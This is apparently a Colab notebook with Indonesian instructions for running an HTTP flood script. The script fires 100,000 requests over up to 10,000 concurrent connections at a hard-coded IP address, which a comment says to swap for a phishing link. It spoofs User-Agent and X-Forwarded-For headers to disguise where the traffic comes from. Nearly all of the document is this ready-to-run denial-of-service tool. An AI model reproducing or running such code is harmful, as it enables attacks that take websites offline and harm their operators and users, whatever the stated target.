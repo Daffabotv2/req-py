{
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "pencet run di bawah untuk install library dulu"
      ],
      "metadata": {
        "id": "zaOBozm3rLpI"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "pip install aiohttp fake-useragent nest_asyncio"
      ],
      "metadata": {
        "id": "aZTL_jILmpK_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "pencet run di bawah untuk run requestnya"
      ],
      "metadata": {
        "id": "aKhCPZwDrS2r"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "7sK6RyyWC4nu"
      },
      "outputs": [],
      "source": [
        "import asyncio\n",
        "import aiohttp\n",
        "import time\n",
        "import random\n",
        "from fake_useragent import UserAgent\n",
        "import nest_asyncio\n",
        "\n",
        "nest_asyncio.apply()\n",
        "\n",
        "# Target\n",
        "URL = \"http://139.99.61.184/~bansosp5/\"  # Ganti dengan link phising\n",
        "CONNECTIONS = 10000\n",
        "REQUESTS = 100000\n",
        "\n",
        "ua = UserAgent()\n",
        "\n",
        "# IP Generator — hindari reserved ranges\n",
        "def random_ip():\n",
        "    while True:\n",
        "        ip = [random.randint(1, 254) for _ in range(4)]\n",
        "        if ip[0] in [10, 127, 172, 192, 169, 0, 224, 240]:\n",
        "            continue\n",
        "        return \".\".join(map(str, ip))\n",
        "\n",
        "# Fungsi request dengan header spoof\n",
        "async def fetch(session):\n",
        "    start = time.time()\n",
        "    try:\n",
        "        headers = {\n",
        "            \"User-Agent\": ua.random,\n",
        "            \"X-Forwarded-For\": random_ip(),\n",
        "            \"Referer\": URL,\n",
        "            \"Accept\": \"*/*\",\n",
        "            \"Accept-Encoding\": \"gzip, deflate\",\n",
        "            \"Accept-Language\": \"en-US,en;q=0.9\",\n",
        "            \"Cache-Control\": \"no-cache\",\n",
        "            \"Pragma\": \"no-cache\",\n",
        "            \"Connection\": \"keep-alive\",\n",
        "            \"DNT\": \"1\",\n",
        "        }\n",
        "        async with session.get(URL, headers=headers, timeout=12) as response:\n",
        "            duration = time.time() - start\n",
        "            print(f\"✅ {response.status} in {duration:.2f}s\", end=' ')\n",
        "            if response.status != 200:\n",
        "                print(f\"⚠️ {response.status}\", end=' ')\n",
        "    except Exception as e:\n",
        "        duration = time.time() - start\n",
        "        print(f\"\\n❌ {type(e).__name__} after {duration:.2f}s\", end=' ')\n",
        "\n",
        "# Main flood loop\n",
        "async def main():\n",
        "    connector = aiohttp.TCPConnector(limit=CONNECTIONS, limit_per_host=CONNECTIONS)\n",
        "    async with aiohttp.ClientSession(connector=connector) as session:\n",
        "        tasks = []\n",
        "        for i in range(REQUESTS):\n",
        "            tasks.append(fetch(session))\n",
        "            if len(tasks) % 1000 == 0:\n",
        "                await asyncio.gather(*tasks)\n",
        "                tasks = []\n",
        "        if tasks:\n",
        "            await asyncio.gather(*tasks)\n",
        "\n",
        "# Jalankan\n",
        "start = time.time()\n",
        "await main()\n",
        "print(f\"\\n✅ Selesai dalam {time.time() - start:.2f} detik\")"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}